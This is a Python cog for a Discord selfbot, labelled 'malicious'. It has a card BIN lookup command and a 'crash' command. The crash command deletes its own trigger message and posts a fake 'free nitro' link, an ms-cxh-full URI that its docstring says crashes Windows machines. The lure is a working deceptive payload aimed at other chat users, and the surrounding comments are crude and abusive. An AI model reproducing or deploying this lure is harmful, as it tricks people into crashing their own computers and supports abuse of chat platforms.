import discord
import asyncio
from discord.ext import commands
import requests
import json
import urllib.request, json


class malicious(commands.Cog):
    """Uhhh discord coding is shit"""

    def __init__(self, bot):
        self.bot = bot


    @commands.command()
    async def bin(self, ctx, message):
        """Shows basic info about the given bin number
        Note: Can only be used 10 times per 10 minutes


        Paramaters
        • bin - the fucking bin number
        """
        bin = message
        lookup = "https://lookup.binlist.net/" + bin
        with urllib.request.urlopen(lookup) as url:
            data = json.loads(url.read().decode())

        ### Parse json response
        sch = data["scheme"]
        type = data["type"]
        brand = data["brand"]
        prepd = data["prepaid"]
        country = data["country"]["name"]
        bankname = data["bank"]["name"]
        site = data["bank"]["url"]
        phone = data["bank"]["phone"]
        city = data["bank"]["city"]


        ### Make embed
        embed = discord.Embed(title=bin, color=0xff0000)
        embed.set_author(name="Bin Lookup for")
        embed.set_thumbnail(url="https://i.imgur.com/E5YiHfL.png")
        embed.add_field(name="===============", value="===============", inline=False)
        embed.add_field(name="Scheme:", value=sch, inline=False)
        embed.add_field(name="Type:", value=type, inline=False)
        embed.add_field(name="Brand:", value=brand, inline=False)
        embed.add_field(name="Prepaid:", value=prepd, inline=False)
        embed.add_field(name="Country:", value=country, inline=False)
        embed.add_field(name="Bank:", value=bankname, inline=False)
        embed.add_field(name="Website:", value=site, inline=False)
        embed.add_field(name="Phone:", value=phone, inline=False)
        embed.add_field(name="City:", value=city, inline=False)
        embed.set_footer(text="Quite possibly the shittest selfbot made by Daddie#6969")

        await ctx.send(embed=embed)



    @commands.command()
    async def crash(self, ctx):
        """Sends a link when clicked rapes a windwos computer"""
        await ctx.message.delete()
        await ctx.send("Click this for free nitro! <ms-cxh-full://0>")

### Discord blockbypass coming soon. Creds to Yaekith for that shit
    #@commands.command()


def setup(bot):
    bot.add_cog(malicious(bot))
